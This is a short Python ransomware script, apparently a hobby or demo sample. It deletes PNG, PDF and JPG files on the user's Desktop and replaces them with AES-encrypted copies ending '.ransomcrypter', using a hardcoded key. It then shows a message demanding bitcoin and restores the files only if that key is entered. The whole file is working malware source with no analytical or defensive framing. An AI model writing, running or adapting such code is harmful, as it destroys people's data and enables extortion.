import os
import glob
import time
import pyaes
from pathlib import Path

list_arquivo = ["*.PNG","*.pdf","*.jpg"]
print('Criptografando')
time.sleep(3)
try:
    desktop = Path.home() / "Desktop"
except Exception:
    pass
os.chdir(desktop)

def criptografia():
    for files in list_arquivo:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}//{format_file}', 'rb')
            file_date = f.read()
            f.close()

            os.remove(f'{desktop}//{format_file}')
            key = b"A5p9l314f6p0vm4z"
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_date = aes.encrypt(file_date)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}//{new_file}',"wb")
            new_file.write(crypto_date)
            new_file.close()

def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):
            keybytes = decrypt_file.encode()
            name_file = open(file, "rb")
            file_date = name_file.read()
            dkey = keybytes
            deas = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_date = deas.decrypt(file_date)
            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]
            dnew_file = open(f'{desktop}//{new_file_name}', 'wb')
            dnew_file.write(decrypt_date)
            dnew_file.close()
    except ValueError as err:
        print('the Key isnt valid')

if __name__ == '__main__':
    criptografia()
    if criptografia:
        key = input('Your PC has been hacked...I give you 1 chance to try to acess\nIf you dont have to pay a value in bit coins, or your data will be compromised:')
        if key == "A5p9l314f6p0vm4z":
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}//{del_file}')
        else:
            print('The Key isnt valid!!')